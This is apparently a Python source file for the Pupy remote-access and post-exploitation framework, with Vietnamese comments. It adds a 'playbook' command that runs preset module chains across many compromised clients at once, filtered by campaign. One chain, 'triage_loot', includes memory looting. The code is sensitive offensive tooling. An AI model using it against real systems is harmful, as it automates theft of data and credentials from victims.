# -*- encoding: utf-8 -*-


"""
playbook: chạy một chuỗi module (playbook thu thập/điều tra nhanh)
trên một hoặc nhiều client, dựa trên filter (vd: campaign).
"""

from argparse import REMAINDER

from pupy.pupylib.PupyModule import PupyArgumentParser, PupyModuleUsageError
from pupy.pupylib.PupyOutput import Error, Line, Color, Success, Table
from pupy.pupylib.PupyJob import PupyJob

from pupy.pupylib.PupyCompleter import (
    module_name_completer, module_args_completer
)


usage = 'Run a predefined playbook (sequence of modules) on one or multiple clients'
parser = PupyArgumentParser(prog='playbook', description=usage)

parser.add_argument(
    'playbook', metavar='<playbook>',
    help='Playbook name (vd: triage_basic)'
)
parser.add_argument(
    '-f', '--filter', metavar='<client filter>',
    help='Lọc client, giống lệnh run -f (vd: campaign:XYZ, platform:win)'
)
parser.add_argument(
    '-b', '--background', action='store_true',
    help='Chạy playbook ở background (không giữ console)'
)
parser.add_argument(
    '--list', action='store_true',
    help='Liệt kê các playbook có sẵn'
)
parser.add_argument(
    'arguments',
    nargs=REMAINDER,
    default='',
    metavar='<extra arguments>',
    help='(Tùy chọn) args bổ sung cho từng module, append vào cuối',
    completer=module_args_completer
)


# Playbook mẫu – có thể mở rộng thêm sau
# Mỗi phần tử: (module_name, [arg1, arg2, ...])
PLAYBOOKS = {
    # Thu thập nhanh thông tin hệ thống + cloud metadata (nếu có)
    'triage_basic': [
        ('get_info', []),
        ('cloudinfo', []),
    ],
    # Thu thập loot cơ bản (có thể ồn hơn)
    'triage_loot': [
        ('get_info', []),
        ('cloudinfo', []),
        ('loot_memory', []),
    ],
    # IR cơ bản cho Windows: info + VM check + logs + netmon
    'triage_ir_win': [
        ('get_info', []),
        ('check_vm', []),
        ('readlogs', []),
        ('netmon', []),
    ],
}


def _run_single_module(server, handler, module_name, clients, args, background):
    """Chạy một module trên danh sách clients (tương tự lệnh run)."""
    try:
        module = server.get_module(
            server.get_module_name_from_category(module_name)
        )
    except PupyModuleUsageError as e:
        prog, message, usage = e.args
        handler.display(Line(Error(prog + ':'), Color(message, 'lightred')))
        handler.display(usage)
        return
    except Exception as e:
        handler.display(Error(e, module_name))
        return

    if not module:
        handler.display(Error('Unknown module', module_name))
        return

    # Parse args theo module
    jobargs = module.parse(args)

    pj = PupyJob(
        server,
        module, '{} {}'.format(module_name, ' '.join(args)),
        jobargs
    )

    ios = handler.acquire_io(
        module.io, len(clients),
        background or module.daemon,
        pipe=None
    )

    for io, client in zip(ios, clients):
        io.set_title(
            client if isinstance(client, str) else str(client)
        )

        instance = module(client, pj, io, log=None)
        pj.add_module(instance)

    try:
        pj.start(once=False)
    except Exception as e:
        handler.display(Error('Module launch failed: {}'.format(e)))
        pj.stop()

    handler.process(
        pj,
        background=background,
        daemon=module.daemon,
        unique=False
    )


def do(server, handler, config, modargs):
    """Entry point cho lệnh playbook."""
    if modargs.list:
        rows = [{
            'NAME': name,
            'MODULES': ', '.join(m for m, _ in steps),
        } for name, steps in sorted(PLAYBOOKS.items())]
        if not rows:
            handler.display(Success('No playbooks defined'))
            return
        handler.display(Table(rows, ['NAME', 'MODULES']))
        return

    pb_name = modargs.playbook
    if pb_name not in PLAYBOOKS:
        handler.display(Error('Unknown playbook', pb_name))
        handler.display(Success('Available: {}'.format(
            ', '.join(sorted(PLAYBOOKS.keys()))
        )))
        return

    clients_filter = modargs.filter or handler.default_filter
    clients = server.get_clients(clients_filter)
    if not clients:
        if not server.clients:
            handler.display(Error('No clients currently connected'))
        else:
            handler.display(Error('No clients match this search!'))
        return

    handler.display(Success(
        'Running playbook "{}" on {} client(s)'.format(
            pb_name, len(clients)
        )
    ))

    extra_args = list(modargs.arguments or [])

    for module_name, base_args in PLAYBOOKS[pb_name]:
        # Mỗi bước: args = base_args + extra_args (nếu có)
        step_args = list(base_args) + extra_args
        handler.display(Success(
            ' -> {} {}'.format(module_name, ' '.join(step_args))
        ))
        _run_single_module(
            server, handler, module_name, clients,
            step_args, modargs.background
        )

